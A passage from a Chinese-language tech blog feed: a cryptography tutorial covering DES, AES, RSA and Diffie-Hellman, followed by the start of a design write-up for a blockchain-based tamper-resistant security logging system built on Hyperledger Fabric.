with zero (null)characters</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DES INPUT BLOCK  = f  o  r  _  _  _  _  _<br>(IN HEX)           66 6f 72 00 00 00 00 00<br>KEY              = 01 23 45 67 89 AB CD EF<br>DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75<br></code></pre></td></tr></table></figure><h3 id="pad-with-spaces">Pad with spaces</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DES INPUT BLOCK  = f  o  r  _  _  _  _  _<br>(IN HEX)           66 6f 72 20 20 20 20 20<br>KEY              = 01 23 45 67 89 AB CD EF<br>DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25<br></code></pre></td></tr></table></figure><h2 id="工作模式">工作模式</h2><p>分组密码的工作模式是：根据不同的数据格式和安全性要求,以一个具体的分组密码算法为基础构造一个分组密码系统的方法。分组密码的工作模式应当力求简单,有效和易于实现，需要采用适当的工作模式来隐蔽明文的统计特性、数据的格式等，降低删除、重放、插入和伪造成功的机会。</p><p>分组密码的主要工作模式：</p><ol type="1"><li>电码本(ECB)模式</li><li>密码分组链接(CBC)模式</li><li>密码反馈(CFB)模式</li><li>输出反馈(OFB)模式</li><li>计数器(CTR)模式</li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/工作模式比较.png"alt="分组密码的工作模式比较" /><figcaption aria-hidden="true">分组密码的工作模式比较</figcaption></figure><h2 id="基本策略">基本策略</h2><p>在分组密码设计时，充分使用了 Shannon提出的两大策略：混淆与扩散两大策略。</p><h3 id="混淆">混淆</h3><p>混淆，Confusion，将密文与密钥之间的统计关系变得尽可能复杂，使得攻击者即使获取了密文的一些统计特性，也无法推测密钥。一般使用复杂的非线性变换可以得到很好的混淆效果，常见的方法如下</p><ul><li>S 盒</li><li>乘法</li></ul><h3 id="扩散">扩散</h3><p>扩散，Diffusion，使得明文中的每一位影响密文中的许多位。常见的方法有</p><ul><li>线性变换</li><li>置换</li><li>移位，循环移位</li></ul><h2 id="常见加解密结构">常见加解密结构</h2><p>目前块加密中主要使用的是结构是</p><ul><li>迭代结构，这是因为迭代结构便于设计与实现，同时方便安全性评估。</li></ul><h3 id="迭代结构">迭代结构</h3><h4 id="概述-1">概述</h4><p>迭代结构基本如下，一般包括三个部分</p><ul><li>密钥置换</li><li>轮加密函数</li><li>轮解密函数</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/iterated_cipher.png"alt="iterated_cipher" /><figcaption aria-hidden="true">iterated_cipher</figcaption></figure><h4 id="轮函数">轮函数</h4><p>目前来说，轮函数主要有主要有以下设计方法</p><ul><li>Feistel Network，由 Horst Feistel 发明，DES 设计者之一。<ul><li>DES</li></ul></li><li>Substitution-Permutation Network(SPN)<ul><li>AES</li></ul></li><li>其他方案</li></ul><h4 id="密钥扩展">密钥扩展</h4><p>目前，密钥扩展的方法有很多，没有见到什么完美的密钥扩展方法，基本原则是使得密钥的每一个比特尽可能影响多轮的轮密钥。</p><h2 id="des">DES</h2><h3 id="基本介绍-1">基本介绍</h3><p>Data EncryptionStandard(DES)，数据加密标准，是典型的块加密，其基本信息如下</p><ul><li>输入 64 位。</li><li>输出 64 位。</li><li>密钥 64 位，使用 64 位密钥中的 56 位，剩余的 8位要么丢弃，要么作为奇偶校验位。</li><li>Feistel 迭代结构<ul><li>明文经过 16 轮迭代得到密文。</li><li>密文经过类似的 16 轮迭代得到明文。</li></ul></li></ul><h3 id="基本流程-1">基本流程</h3><p>给出一张简单的 DES 流程图。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/des.gif"alt="des" /><figcaption aria-hidden="true">des</figcaption></figure><h4 id="加密">加密</h4><p>我们可以考虑一下每一轮的加密过程</p><p><spanclass="math display"><em>L</em><sub><em>i</em> + 1</sub> = <em>R</em><sub><em>i</em></sub></span></p><p><spanclass="math display"><em>R</em><sub><em>i</em> + 1</sub> = <em>L</em><sub><em>i</em></sub> ⊕ <em>F</em>(<em>R</em><sub><em>i</em></sub>, <em>K</em><sub><em>i</em></sub>)</span></p><p>那么在最后的 Permutation 之前，对应的密文为<spanclass="math inline">(<em>R</em><sub><em>n</em> + 1</sub>, <em>L</em><sub><em>n</em> + 1</sub>)</span>。</p><h4 id="解密">解密</h4><p>那么解密如何解密呢？首先我们可以把密文先进行逆置换，那么就可以得到最后一轮的输出。我们这时考虑每一轮</p><p><spanclass="math display"><em>R</em><sub><em>i</em></sub> = <em>L</em><sub><em>i</em> + 1</sub></span></p><p><spanclass="math display"><em>L</em><sub><em>i</em></sub> = <em>R</em><sub><em>i</em> + 1</sub> ⊕ <em>F</em>(<em>L</em><sub><em>i</em> + 1</sub>, <em>K</em><sub><em>i</em></sub>)</span></p><p>因此，<spanclass="math inline">(<em>L</em><sub>0</sub>, <em>R</em><sub>0</sub>)</span>就是加密时第一次置换后的明文。我们只需要再执行逆置换就可以获得明文了。</p><p>可以看出，DES 加解密使用同一套逻辑，只是密钥使用的顺序不一致。</p><h3 id="核心部件">核心部件</h3><p>DES 中的核心部件主要包括（这里只给出加密过程的）</p><ul><li>初始置换</li><li>F 函数<ul><li>E 扩展函数</li><li>S 盒，设计标准未给出。</li><li>P 置换</li></ul></li><li>最后置换</li></ul><p>其中 F 函数如下</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/f-function.png"alt="f-function" /><figcaption aria-hidden="true">f-function</figcaption></figure><p>如果对 DES 更加感兴趣，可以进行更加仔细地研究。欢迎提供 PR。</p><h3 id="衍生">衍生</h3><p>在 DES 的基础上，衍生了以下两种加密方式</p><ul><li>双重 DES</li><li>三种 DES</li></ul><h4 id="双重-des">双重 DES</h4><p>双重 DES 使用两个密钥，长度为 112 比特。加密方式如下</p><p><spanclass="math display"><em>C</em> = <em>E</em><sub><em>k</em>2</sub>(<em>E</em><sub><em>k</em>1</sub>(<em>P</em>))</span></p><p>但是双重 DES 不能抵抗中间相遇攻击，我们可以构造如下两个集合</p><p><spanclass="math display"><em>I</em> = <em>E</em><sub><em>k</em>1</sub>(<em>P</em>)</span></p><p><spanclass="math display"><em>J</em> = <em>D</em><sub><em>k</em>2</sub>(<em>C</em>)</span></p><p>即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。</p><p>在我们对 P进行加密完毕后，可以对加密结果进行排序，这样的复杂度为<spanclass="math inline">2<sup><em>n</em></sup><em>l</em><em>o</em><em>g</em>(2<sup><em>n</em></sup>) = <em>O</em>(<em>n</em>2<sup><em>n</em></sup>)</span></p><p>当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询。</p><p>总的复杂度为还是<spanclass="math inline"><em>O</em>(<em>n</em>2<sup><em>n</em></sup>)</span>。</p><h4 id="三重-des">三重 DES</h4><p>三重 DES 的加解密方式如下</p><p><spanclass="math display"><em>C</em> = <em>E</em><sub><em>k</em>3</sub>(<em>D</em><sub><em>k</em>2</sub>(<em>E</em><sub><em>k</em>1</sub>(<em>P</em>)))</span></p><p><spanclass="math display"><em>P</em> = <em>D</em><sub><em>k</em>1</sub>(<em>E</em><sub><em>k</em>2</sub>(<em>D</em><sub><em>k</em>3</sub>(<em>C</em>)))</span></p><p>在选择密钥时，可以有两种方法</p><ul><li>3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。</li><li>2 个不同的密钥，k1 与 k2 独立，k3=k1，112 比特。</li></ul><h3 id="攻击方法">攻击方法</h3><ul><li>差分攻击</li><li>线性攻击</li></ul><h2 id="aes">AES</h2><h3 id="基本介绍-2">基本介绍</h3><p>Advanced EncryptionStandard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 JoanDaemen 和 Vincent Rijmen 所设计。其基本信息如下</p><ul><li>输入：128 比特。</li><li>输出：128 比特。</li><li>SPN 网络结构。</li></ul><p>其迭代轮数与密钥长度有关系，如下</p><table><thead><tr><th style="text-align: center;">密钥长度（比特）</th><th style="text-align: center;">迭代轮数</th></tr></thead><tbody><tr><td style="text-align: center;">128</td><td style="text-align: center;">10</td></tr><tr><td style="text-align: center;">192</td><td style="text-align: center;">12</td></tr><tr><td style="text-align: center;">256</td><td style="text-align: center;">14</td></tr></tbody></table><h3 id="基本流程-2">基本流程</h3><h4 id="基本概念">基本概念</h4><p>在 AES 加解密过程中，每一块都是 128比特，所以我们这里明确一些基本概念。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_data_unit.png"alt="aes_data_unit" /><figcaption aria-hidden="true">aes_data_unit</figcaption></figure><p>在 AES 中，块与 State 之间的转换过程如下</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_block2state.png"alt="aes_block2state" /><figcaption aria-hidden="true">aes_block2state</figcaption></figure><p>所以，可以看出，每一个 block中的字节是按照列排列进入到状态数组的。</p><p>而对于明文来说，一般我们会选择使用其十六进制进行编码。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_plain2state.png"alt="aes_plain2state" /><figcaption aria-hidden="true">aes_plain2state</figcaption></figure><h4 id="加解密过程">加解密过程</h4><p>这里给个看雪上比较好的 <ahref="http://bbs.pediy.com/thread-90722.htm">图例</a>，以便于介绍基本的流程，每一轮主要包括</p><ul><li>轮密钥加，AddRoundKey</li><li>字节替换，SubBytes</li><li>行移位，ShiftRows</li><li>列混淆，MixColumns</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_details.jpg"alt="aes_details" /><figcaption aria-hidden="true">aes_details</figcaption></figure><p>上面的列混淆的矩阵乘法等号左边的列向量应该在右边。</p><p>这里再给一张其加解密的全图，其解密算法的正确性很显然。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_enc_dec.png"alt="aes_enc_dec" /><figcaption aria-hidden="true">aes_enc_dec</figcaption></figure><p>我们这里重点关注一下以下。</p><h5 id="字节替换">字节替换</h5><p>在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_subbytes.png"alt="aes_subbytes" /><figcaption aria-hidden="true">aes_subbytes</figcaption></figure><p>这里的运算均定义在 <spanclass="math inline"><em>G</em><em>F</em>(2<sup>8</sup>)</span> 内。</p><h5 id="列混淆">列混淆</h5><p>这里的运算也是定义在 <spanclass="math inline"><em>G</em><em>F</em>(2<sup>8</sup>)</span>上，使用的模多项式为 <spanclass="math inline"><em>x</em><sup>8</sup> + <em>x</em><sup>4</sup> + <em>x</em><sup>3</sup> + 1</span>。</p><h5 id="密钥扩展-1">密钥扩展</h5><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/aes_key_expansion.png"alt="aes_key_expansion" /><figcaption aria-hidden="true">aes_key_expansion</figcaption></figure><h3 id="等价解密算法">等价解密算法</h3><p>简单分析一下，我们可以发现</p><ul><li>交换逆向行移位和逆向字节代替并不影响结果。</li><li>交换轮密钥加和逆向列混淆并不影响结果，关键在于<ul><li>首先可以把异或看成域上的多项式加法</li><li>然后多项式中乘法对加法具有分配率。</li></ul></li></ul><h3 id="攻击方法-1">攻击方法</h3><ul><li>积分攻击</li></ul><h1 id="非对称加密">非对称加密</h1><h2 id="介绍-2">介绍</h2><p>在非对称密码中，加密者与解密者所使用的密钥并不一样，典型的有 RSA加密，背包加密，椭圆曲线加密。</p><h2 id="rsa">RSA</h2><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA被广泛使用。RSA 是 1977 年由罗纳德·李维斯特（RonRivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（LeonardAdleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p><p>RSA算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的RSA 密钥才可能被强力方式解破。到 2020 年为止，还没有任何可靠的攻击 RSA算法的方式。</p><h3 id="基本原理">基本原理</h3><h4 id="公钥与私钥的产生">公钥与私钥的产生</h4><ol type="1"><li>随机选择两个不同大质数 <span class="math inline"><em>p</em></span>和 <span class="math inline"><em>q</em></span>，计算 <spanclass="math inline"><em>N</em> = <em>p</em> × <em>q</em></span></li><li>根据欧拉函数，求得 <spanclass="math inline"><em>φ</em>(<em>N</em>) = <em>φ</em>(<em>p</em>)<em>φ</em>(<em>q</em>) = (<em>p</em> − 1)(<em>q</em> − 1)</span></li><li>选择一个小于 <span class="math inline"><em>φ</em>(<em>N</em>)</span>的整数 <span class="math inline"><em>e</em></span>，使 <spanclass="math inline"><em>e</em></span> 和 <spanclass="math inline"><em>φ</em>(<em>N</em>)</span> 互质。并求得 <spanclass="math inline"><em>e</em></span> 关于 <spanclass="math inline"><em>φ</em>(<em>N</em>)</span> 的模反元素，命名为<span class="math inline"><em>d</em></span>，有 <spanclass="math inline"><em>e</em><em>d</em> ≡ 1 (mod  <em>φ</em>(<em>N</em>))</span></li><li>将 <span class="math inline"><em>p</em>​</span> 和 <spanclass="math inline"><em>q</em>​</span> 的记录销毁</li></ol><p>此时，<span class="math inline">(<em>N</em>, <em>e</em>)</span>是公钥，<span class="math inline">(<em>N</em>, <em>d</em>)</span>是私钥。</p><h4 id="消息加密">消息加密</h4><p>首先需要将消息 以一个双方约定好的格式转化为一个小于 <spanclass="math inline"><em>N</em></span>，且与 <spanclass="math inline"><em>N</em></span> 互质的整数 <spanclass="math inline"><em>m</em></span>。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：</p><p><spanclass="math display"><em>m</em><sup><em>e</em></sup> ≡ <em>c</em> (mod  <em>N</em>)</span></p><h4 id="消息解密">消息解密</h4><p>利用密钥 <span class="math inline"><em>d</em>​</span> 进行解密。</p><p><spanclass="math display"><em>c</em><sup><em>d</em></sup> ≡ <em>m</em> (mod  <em>N</em>)</span></p><h4 id="正确性证明">正确性证明</h4><p>即我们要证<spanclass="math inline"><em>m</em><sup><em>e</em><em>d</em></sup> ≡ <em>m</em> mod  <em>N</em></span>，已知<spanclass="math inline"><em>e</em><em>d</em> ≡ 1 mod  <em>ϕ</em>(<em>N</em>)</span>，那么<spanclass="math inline"><em>e</em><em>d</em> = <em>k</em><em>ϕ</em>(<em>N</em>) + 1</span>，即需要证明</p><p><spanclass="math display"><em>m</em><sup><em>k</em><em>ϕ</em>(<em>N</em>) + 1</sup> ≡ <em>m</em> mod  <em>N</em></span></p><p>这里我们分两种情况证明</p><p>第一种情况 <spanclass="math inline"><em>g</em><em>c</em><em>d</em>(<em>m</em>, <em>N</em>) = 1​</span>，那么<spanclass="math inline"><em>m</em><sup><em>ϕ</em>(<em>N</em>)</sup> ≡ 1 mod  <em>N</em>​</span>，因此原式成立。</p><p>第二种情况 <spanclass="math inline"><em>g</em><em>c</em><em>d</em>(<em>m</em>, <em>N</em>) ≠ 1</span>，那么<span class="math inline"><em>m</em></span> 必然是 <spanclass="math inline"><em>p</em></span> 或者 <spanclass="math inline"><em>q</em></span> 的倍数，并且 <spanclass="math inline"><em>n</em> = <em>m</em></span> 小于 <spanclass="math inline"><em>N</em></span>。我们假设</p><p><spanclass="math display"><em>m</em> = <em>x</em><em>p</em></span></p><p>那么 <span class="math inline"><em>x</em></span> 必然小于 <spanclass="math inline"><em>q</em></span>，又由于 <spanclass="math inline"><em>q</em></span> 是素数。那么</p><p><spanclass="math display"><em>m</em><sup><em>ϕ</em>(<em>q</em>)</sup> ≡ 1 mod  <em>q</em></span></p><p>进而</p><p><spanclass="math display"><em>m</em><sup><em>k</em><em>ϕ</em>(<em>N</em>)</sup> = <em>m</em><sup><em>k</em>(<em>p</em> − 1)(<em>q</em> − 1)</sup> = (<em>m</em><sup><em>ϕ</em>(<em>q</em>)</sup>)<sup><em>k</em>(<em>p</em> − 1)</sup> ≡ 1 mod  <em>q</em></span></p><p>那么</p><p><spanclass="math display"><em>m</em><sup><em>k</em><em>ϕ</em>(<em>N</em>) + 1</sup> = <em>m</em> + <em>u</em><em>q</em><em>m</em></span></p><p>进而</p><p><spanclass="math display"><em>m</em><sup><em>k</em><em>ϕ</em>(<em>N</em>) + 1</sup> = <em>m</em> + <em>u</em><em>q</em><em>x</em><em>p</em> = <em>m</em> + <em>u</em><em>x</em><em>N</em></span></p><p>所以原式成立。</p><h3 id="样例-2">样例</h3><h4 id="例1">例1</h4><h5 id="计算公钥和私钥">计算公钥和私钥</h5><ol type="1"><li><p>p = 13 , q = 5</p><ul><li>N = pq = 65</li><li>r = (p-1)(q-1) = (13-1)(5-1) = 48</li></ul></li><li><p>计算模反元素 r=48，选择e=5，得到二元一次方程：5d-48k=1 ,获得一组解：d=29，k=3</p></li><li><p>因此，公钥是 (N, e) = (65, 5)，私钥是 (N, d) = (65,29)。</p></li></ol><h5 id="加密信息">加密信息</h5><ol type="1"><li><p>明文：m=3</p></li><li><p>计算: $ c ^{5} $</p></li><li><p>因此：3被加密为48</p></li></ol><h5 id="解密信息">解密信息</h5><ol type="1"><li><p>密文：c=48</p></li><li><p>计算：$ n ^{29} $</p></li><li><p>因此：48被解密为3</p></li></ol><h4 id="例2">例2</h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/rsa.png"alt="rsa-1" /><figcaption aria-hidden="true">rsa-1</figcaption></figure><h1 id="密码协议">密码协议</h1><h2 id="diffie-hellman-密钥交换">Diffie-Hellman 密钥交换</h2><ul><li>密钥交换是实现安全通信的基础<ul><li>商用加密算法AES和DES需要在安全通信之前，实现通信双方的密钥共享。</li></ul></li><li>密钥交换的方法：<ul><li>基于RSA的密钥交换；</li><li>基于KDC技术 (Key Distributed Center，密钥分发中心)；</li><li><strong>Diffie-Hellman密钥交换</strong>（简称：DH算法）；</li><li>基于物理层的密钥交换。</li></ul></li></ul><p>DH算法是不安全信道下实现安全密钥共享的一种方法，由 W. Diffie 和M.Hellman 在1976年提出的第一个公开的<strong>公钥密码算法</strong>。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/DH-1.png"alt="DH-1" /><figcaption aria-hidden="true">DH-1</figcaption></figure><h2 id="dh协议案例">DH协议案例</h2><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/DH-3.png"alt="DH-3" /> <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/DH-2.png"alt="DH-2" /></p><h1 id="参考">参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://github.com/Mundi-Xu/cipher_web_rocket"class="uri">https://github.com/Mundi-Xu/cipher_web_rocket</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><ahref="https://github.com/yuankeyang/python/blob/master/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B.pdf">深入浅出密码学——常用加密技术原理与应用</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cryptography</tag>
      
      <tag>Symmetric Cryptography</tag>
      
      <tag>Asymmetric Cryptography</tag>
      
      <tag>rust</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于区块链的安全日志系统</title>
    <link href="/2020/07/01/Blockchain-based-security-log-system/"/>
    <url>/2020/07/01/Blockchain-based-security-log-system/</url>
    
    <content type="html"><![CDATA[<h1 id="摘要">摘要</h1><p>信息系统中存在着大量的安全设备日志，这些日志对<strong>系统监控</strong>、查询、<strong>安全审计</strong>和<strong>故障诊断</strong>等都十分重要。与此同时，黑客入侵系统时，日志为黑客的行为提供了证据。因此对其进行安全的存储与处理具有重要意义。区块链技术的发展，为实现日志信息的保护、分享、<strong>取证</strong>、多边利益最大化提供了可能，为实现安全日志系统提供了保障。</p><p>基于<strong>区块链技术</strong>，本项目设计并实现了安全日志系统。该系统采用链上数据存储模式，将本地日志上传至区块链中存储，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。通过安全性分析论证了该系统能够保证安全设备日志的安全可靠存储，同时为日志分析，日志取证提供便利。本项目解决了日志易被删除，篡改，伪造等问题，满足了学校、公司等云存储系统的安全日志审计，并极大的提高了数据存储的安全性，减轻运维人员的压力。</p><h1 id="概述">概述</h1><h2 id="背景">背景</h2><p>云计算已经被认为是下一代的信息技术基础设施，因为它在信息技术的发展史上有着史无前例的优势：自助按需服务，随时随地地进行网络访问，位置独立的资源池、弹性资源，基于使用的计费以及风险转移。作为一项具有深远影响的颠覆性技术，云计算正在改变企业使用信息技术的模式，一个典型的方面是数据正在被集中外包给云。从用户角度来看，包括个人和企业用户，将数据灵活的以按需分配的方式存储到云端带来了有吸引力的好处：缓解了存储管理负担，减少了在硬件、软件以及维护人员上的花销。云存储的概念正是从云计算引申而来的，它是一种通过将网络中不同的存储设备利用分布式和集群技术组合起来协同工作的新型存储技术，并能够对外提供大量数据的存储服务以及业务访问服务。日志即为一种云存储的方式。用户通过URL请求特定域名下的资源，这些资源会被保存在特定服务器上，<strong>Web服务器在响应用户请求的同时可以以日志文件记录用户请求的全过程</strong>，即Web日志。日志几乎内建于所有的系统中，它被用于<strong>记录系统运行时产生的信息</strong>，如日常操作、网络访问、系统警告等事件的相关属性和信息。</p><p>随着互联网的迅速发展，计算机系统从防火墙、数字加密、身份认证、访问控制、数字签名技术等方面加强安全维护，但仍存在被非授权用户攻击的风险。<strong>日志经常是入侵者的主要攻击目标，容易受到篡改、删除、伪造等破坏。</strong>存储安全是数据安全的关键。因此，建立安全的日志系统是非常必要的。</p><p>区块链技术的发展，为实现日志信息的保护、分享、多边利益最大化提供了可能，为实现安全日志系统提供了保障。区块链技术具有<strong>去中心化</strong>、<strong>不可篡改</strong>和<strong>追踪溯源</strong>等特性，其应用场景已涉及医疗、电网、农产品追溯方向。区块链将信任关系从中心化的机构转移到所有参与计算的个体上，一旦某个交易被篡改，区块链网络中的节点会检测出该行为，只有多个节点同时遭受攻击时才会面临数据的丢失和泄露等风险，从而可以防止数据泄露、合谋攻击、伪造等不良行为。</p><h2 id="特色描述">特色描述</h2><p>目前，区块链和日志服务系统存在以下匹配或矛盾的地方：</p><ol type="1"><li>区块链有多个副本，有助于日志的保存；</li><li>共识机制缓慢不利于日志的保存；</li><li>共识机制可保障日志的先后顺序不被打乱；</li><li>具有可追溯性，每个日志都有数字签名，可以明确查到提交者；</li><li>区块链节点数量少时安全性降低；</li><li>由于每个节点都保存日志的完整版本，对存储空间消耗大。</li></ol><p>综上所述，我们对本项目进行了系统性分析、规划，以下为该项目的特点：</p><ol type="1"><li>分布式存储多个副本；</li><li>灵活支持多种日志格式，便于程序化分析；</li><li>顺序性有保障；</li><li>防篡改；</li><li>多方签名防日志伪造；</li><li>机器使用可信根作为信任基；</li><li>日志存储准确率高；</li><li>提供可视化界面，方便查看。</li></ol><h2 id="前景分析">前景分析</h2><p>区块链因为比特币的的出现为人们所熟知，从产生迄今，在金融、证券、资本和科技行业的应用呈现出爆发式增长。虽然比特币是区块链最著名的应用，但区块链可以应用于远不止加密货币的各种应用。由于它可以在没有银行或任何第三方可信中间机构的情况下在双方之间完成支付，区块链可以应用于数字资产、汇款以及在线支付等各种金融服务。此外，构建于区块链技术之上的各种应用，例如<strong>智能合约应用</strong>、<strong>物联网</strong>和<strong>安全服务</strong>等，也正在成为构建下一代互联网应用最有前景的技术之一。</p><p>区块链技术的出现也为<strong>云存储安全</strong>的研究提供了一种新的研究思路。因为在现实环境中，完全公平公开的第三方机构是不可能的，且存在多个参与方共谋攻击或者欺骗另一方的问题。区块链技术去中心化的分布式架构和去信任化的运行机制使得建立一个<strong>不依赖于可信第三方的去中心化审计</strong>架构成为可能。区块链中每个区块的数据以时间顺序加密存放，具有唯一性。倘若篡改其中某区块的数据，从理论上来说其计算开销是相当巨大的，而且修改是不可逆的，这样就制约了服务商随意篡改数据的行为。区块链技术的去中心化存储架构，只有区块链网络中的多个对等节点同时遭受攻击时才会面临数据的丢失和泄露等风险，从而可以防止数据泄露等危险。</p><p>伴随着高级持续威胁攻击的复杂多变，安全技术、产品不断推陈出新，安全厂商推出的防火墙、网络入侵检测、网络入侵防御、蜜罐、上网行为管理、安全审计、网络流量分析等众多产品涵盖到了网络安全、主机安全、Web安全、数据安全、移动安全、安全管理、工控安全等各个方面，同时也就是因为产品多样、技术多变，导致安全信息无法整合、高效利用。常见的日志服务器虽然实现了系统相关信息的存储，不能保证日志的安全问题。加强Web网站的网络和信息安全，仍需一种安全的日志系统。在这种情况下，基于区块链的安全日志系统就为解决问题提供了可能。该项目通过结合区块链技术，设计链上数据存储模式，有效地解决了日志文件易被篡改的问题，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。</p><p>本项目的针对范围是提供Web服务的中小企业，它们内部维护有大量服务器，每天需要产生大量的日志，怎样合理地对日志进行分析，抓住重点，在日志中找到入侵或者非常规请求的操作，解决潜在的Web安全问题，对于有大量Web服务器的公司来说，开发一套安全的日志系统就显得尤为重要，这样不仅增强了系统的安全性，更易于服务器的维护。</p><h1 id="设计与实现">设计与实现</h1><h2 id="整体设计">整体设计</h2><h3 id="功能设计">功能设计</h3><p>本项目设计并实现了基于区块链的安全日志系统。该系统共有三个模块：<strong>日志收集模块</strong>，<strong>日志存储模块</strong>，<strong>日志分析展示模块</strong>。日志收集模块提供日志过滤，关键字提取和日志发送的功能，支持处理任意格式日志。对于日志存储模块，我们基于fabricv0.6区块链实现日志接收，安全存储与查询功能。同时我们利用grafana数据可视化工具与区块链进行对接，实现日志可视化分析功能。在各个模块的数据传输中，会对数据进行<strong>签名</strong>来进行身份验证，以防日志伪造等问题。</p><p>整个项目的功能设计图如下：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/System_design_drawing.jpg"alt="系统功能设计图" /><figcaption aria-hidden="true">系统功能设计图</figcaption></figure><h3 id="硬件拓扑设计">硬件拓扑设计</h3><p>本项目的整体框架是在各个产生日志的web服务器上部署日志收集模块来获取日志，将日志发送到区块链，各节点进行共识后存储。然后grafana从区块链中读取日志数据，进行可视化分析与展示。整个系统的硬件拓扑图如下：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/Hardware_topology_design.png"alt="项目硬件拓扑设计图" /><figcaption aria-hidden="true">项目硬件拓扑设计图</figcaption></figure><h3 id="具体流程设计">具体流程设计</h3><h4 id="日志收集模块设计">日志收集模块设计</h4><p>日志收集模块安装于各个产生日志的服务器上，运维人员通过<strong>HTTPAPI</strong>的方式进行日志收集任务管理、更新，脱离配置文件。日志收集模块接收到任务后，对指定的日志文件进行按行读取，等待读取至100条（默认值，可自定义修改）时，将日志打包根据任务内容进行过滤与关键字段提取，最后发送至区块链。</p><p>工作流程如下：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于区块链的安全日志系统/Collection_module_design.png"alt="日志收集模块设计流程图" /><figcaption aria-hidden="true">日志收集模块设计流程图</figcaption></figure><h4 id="区块链存储模块设计">区块链存储模块设计</h4><p>区块链存储模块是在 hyperledger fabricv0.6的基础上改写智能合约实现的，提供 RESTFUL API进行日志接收，查询日志功能。</p><p>在Fabricv0.6版本中，主要分为Membership、Consensus、Chaincode、Ledger、P2P、EventStream等核心模块。</p><ul><li>Membership：负责签发相应的E-cert、T-cert、TLS-cert等证书。会员注册、⾝身份保护、内容保密、交易审计功 能，以保证平台访问的安全性。</li><li>Consensus：负责整个区块链的共识，统一交易顺序，保证区块链的一致性。</li><li>Chaincode：即链码（Fabric中的智能合约），用于执行区块链网络中的交易。</li><li>Ledger：用于存储Transaction 